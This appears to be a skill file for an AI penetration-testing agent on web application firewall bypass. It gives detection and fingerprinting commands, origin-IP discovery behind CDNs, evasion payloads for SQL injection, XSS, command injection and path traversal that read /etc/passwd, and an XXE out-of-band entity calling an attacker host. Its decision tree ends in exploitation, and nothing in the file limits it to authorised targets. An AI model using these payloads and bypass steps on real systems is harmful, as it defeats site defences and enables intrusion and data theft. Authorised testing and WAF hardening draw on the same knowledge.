# SKILL — waf-bypass

## Purpose
Detect WAF vendor from response signatures, fingerprint the exact product, and apply the correct evasion technique for the confirmed WAF.

## When to load
- Payloads are returning 403/406/429 or a blocked page
- Responses contain WAF-specific headers or cookies
- Need to confirm whether a WAF is present
- Standard injection payloads are being filtered
- Need to find the origin IP behind a CDN/WAF

## Phase 1 — WAF detection

```bash
curl -si "https://target.com/?q=<script>alert(1)</script>" | head -30
curl -si "https://target.com/?id=1' OR '1'='1" | head -30
wafw00f https://target.com -a | tee recon/tech/waf.txt
nmap -p 80,443 --script http-waf-detect,http-waf-fingerprint target.com
curl -sI https://target.com | grep -iE "cf-ray|x-sucuri|x-fw-|incap|akamai|barracuda|mod_sec|bigip"
```

## Phase 2 — Vendor fingerprinting

**Cloudflare:** Headers: CF-RAY, Server: cloudflare. Cookies: __cfduid, cf_clearance, __cf_bm.
**AWS WAF:** Headers: x-amzn-RequestId, x-amzn-trace-id. Via: cloudfront.net.
**Akamai:** Headers: X-Check-Cacheable, Akamai-Request-BC, Server: AkamaiGHost.
**Imperva/Incapsula:** Headers: X-CDN: Incapsula. Cookies: incap_ses_*, visid_incap_*.
**Sucuri:** Headers: X-Sucuri-ID, X-Sucuri-Cache. Cookies: sucuri_cloudproxy_uuid_*.
**ModSecurity:** Error: "406 Not Acceptable" / "This error was generated by Mod_Security".
**F5 BIG-IP ASM:** Headers: Server: BigIP, X-WA-Info. Cookies: TS + 8 hex chars.

## Phase 3 — Origin IP discovery

```bash
TARGET="target.com"
# Historical DNS
curl -s "https://securitytrails.com/domain/$TARGET/history/a"
# Subdomains that bypass CDN
for sub in direct origin www2 dev staging test api mail ftp smtp; do
  ip=$(dig +short $sub.$TARGET 2>/dev/null | tail -1)
  if [ ! -z "$ip" ]; then
    echo "$sub.$TARGET -> $ip"
    curl -sI "http://$ip" -H "Host: $TARGET" | head -5
  fi
done
# Shodan: ssl.cert.subject.cn:"target.com" -org:"Cloudflare"
# SPF records often expose origin IP
dig TXT $TARGET +short | grep -i "spf\|include\|ip4"
```

## Phase 4 — Evasion by vuln class

### SQL injection
```sql
SE/**/LECT, UN/**/ION SEL/**/ECT  -- comment injection
SELECT%09FROM, SELECT%0aFROM       -- whitespace alternatives
sElEcT, UNION ALL SELECT           -- case variation
SELECT 1e0UNION SELECT             -- scientific notation (MySQL)
/*!50000 UNION*/ SELECT            -- version comment
```

### XSS
```html
<ScRiPt>alert(1)</ScRiPt>                 -- case variation
<img/src=x/onerror=alert(1)>              -- no space
<script>eval(atob('YWxlcnQoMSk='))</script> -- base64
<svg/onload=alert(1)>                     -- SVG
<details/open/ontoggle="alert(1)">        -- HTML5 events
```

### Command injection
```bash
;id, |id, ||id, &id, &&id, `id`, $(id)
{id}, ${IFS}id, ca''t${IFS}/etc/passwd
$(printf '\x69\x64'), $(echo aWQ= | base64 -d)
```

### Path traversal
```
..%2F..%2F..%2Fetc%2Fpasswd     -- URL encoded
..%252F..%252Fetc%252Fpasswd    -- double encoded
....//....//....//etc/passwd    -- mixed slashes
../../../etc/passwd%00          -- null byte
```

### XXE
```xml
<?xml version="1.0" encoding="UTF-16"?>  -- encoding change
<!-- Parameter entities for blind OOB exfil -->
<!DOCTYPE r [<!ENTITY % x SYSTEM "http://<LHOST>/"> %x;]>
```

## Phase 5 — Automated evasion

```bash
NORMAL=$(curl -so /dev/null -w "%{http_code}" "https://target.com/page")
BLOCKED=$(curl -so /dev/null -w "%{http_code}" "https://target.com/page?q=<script>alert(1)</script>")
echo "Normal: $NORMAL | With payload: $BLOCKED"
wafw00f https://target.com -a
sqlmap -u "https://target.com/page?id=1" --tamper=space2comment,between,randomcase,charencode
```

## Decision tree

```
Payloads blocked?
├── Yes → run wafw00f → vendor identified?
│   ├── Yes → apply vendor-specific bypass
│   └── No  → try generic encoding variants
│       ├── All blocked → attempt origin IP discovery
│       │   ├── Origin found → test directly against origin IP
│       │   └── Not found → document as blocked, move on
│       └── Bypass found → use for exploitation
└── No → proceed with standard payloads
```

## Rules
- Always baseline the normal response before testing bypasses
- Origin IP bypass is always preferred over evasion — simpler and more reliable
- If ModSec PL3+ or Cloudflare Enterprise confirmed, prioritize origin IP discovery
- Document which bypass worked and which didn't
